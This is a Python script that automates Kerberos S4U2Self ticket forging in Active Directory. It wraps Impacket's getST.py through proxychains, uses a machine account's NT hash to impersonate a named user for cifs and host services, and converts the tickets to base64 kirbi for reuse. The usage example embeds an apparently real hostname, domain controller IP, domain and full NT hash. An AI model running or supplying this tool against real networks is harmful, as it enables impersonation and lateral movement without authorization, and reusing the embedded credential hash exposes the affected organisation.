#!/usr/bin/env python3
"""
S4U2Self ticket wrapper — runs getST, ticketConverter, and base64 per service.

Usage:
    python getst_wrap.py --hostname <HOST> --impersonate <USER> --dc-ip <IP> --domain <DOMAIN> --nt-hash <HASH>

Example:
    python getst_wrap.py --hostname osp-2h-iesutl01 --impersonate servicenowdsc --dc-ip 10.4.8.47 --domain lhi.com --nt-hash 0721b17c0e21002a38ad2e4e876a5298
"""

import argparse
import glob
import os
import subprocess
import sys

LM_HASH = "aad3b435b51404eeaad3b435b51404ee"


def run(cmd, label, debug=False):
    print(f"\n[*] {label}")
    print(f"    $ {' '.join(cmd)}")
    if debug:
        return None
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.stdout.strip():
        print(r.stdout)
    if r.stderr.strip():
        print(r.stderr, file=sys.stderr)
    return r


def cleanup():
    patterns = ["*.ccache", "*.kirbi"]
    removed = []
    for pat in patterns:
        for f in glob.glob(pat):
            os.remove(f)
            removed.append(f)
    if removed:
        for f in removed:
            print(f"    [-] Deleted {f}")
        print(f"\n[+] Removed {len(removed)} file(s)")
    else:
        print("[*] Nothing to clean up")


def main():
    p = argparse.ArgumentParser(description="S4U2Self ticket automation")
    p.add_argument("--hostname",    required=True, metavar="HOSTNAME",
                   help="Machine hostname without domain (e.g. osp-2h-iesutl01)")
    p.add_argument("--impersonate", required=True, metavar="USER",
                   help="Username to impersonate (e.g. servicenowdsc)")
    p.add_argument("--dc-ip",       required=True, metavar="IP",
                   help="Domain controller IP")
    p.add_argument("--domain",      required=True, metavar="DOMAIN",
                   help="Domain (e.g. lhi.com)")
    p.add_argument("--nt-hash",     required=True, metavar="HASH",
                   help="NT hash of the machine account")
    p.add_argument("-s", "--services", default="cifs,host", metavar="SERVICES",
                   help="Comma-separated service types (default: cifs,host)")
    p.add_argument("-d", "--debug", action="store_true",
                   help="Print commands without executing them")
    p.add_argument("-c", "--cleanup", action="store_true",
                   help="Delete all .ccache and .kirbi files in the current directory, then exit")
    args = p.parse_args()

    if args.cleanup:
        print(f"[*] Cleaning up .ccache and .kirbi files in {os.getcwd()}")
        cleanup()

    hostname     = args.hostname.removesuffix(f".{args.domain}")
    fqdn         = f"{hostname}.{args.domain}"
    domain_upper = args.domain.upper()
    hashes       = f"{LM_HASH}:{args.nt_hash}"
    account      = f"{args.domain}/{hostname}$"
    services     = [s.strip() for s in args.services.split(",")]

    if args.debug:
        print("[!] DEBUG MODE — commands will be printed but not executed\n")

    for svc in services:
        altservice = f"{svc}/{fqdn}"
        base       = f"{args.impersonate}@{svc}_{fqdn}@{domain_upper}"
        ccache     = f"{base}.ccache"
        kirbi      = f"{base}.kirbi"

        r = run(
            ["proxychains", "getST.py",
             "-self", "-altservice", altservice,
             "-impersonate", args.impersonate,
             "-dc-ip", args.dc_ip,
             account, "-hashes", hashes],
            f"getST [{svc}]",
            debug=args.debug,
        )
        if r is not None and r.returncode != 0:
            print(f"[!] getST failed for {svc}, skipping", file=sys.stderr)
            continue

        run(["ticketConverter.py", ccache, kirbi], f"ticketConverter [{svc}]", debug=args.debug)

        r = run(["base64", "-w", "0", kirbi], f"base64 [{svc}]", debug=args.debug)
        if r is not None and r.returncode == 0:
            print(f"\n[+] {svc} kirbi (base64):\n{r.stdout.strip()}\n")


if __name__ == "__main__":
    main()
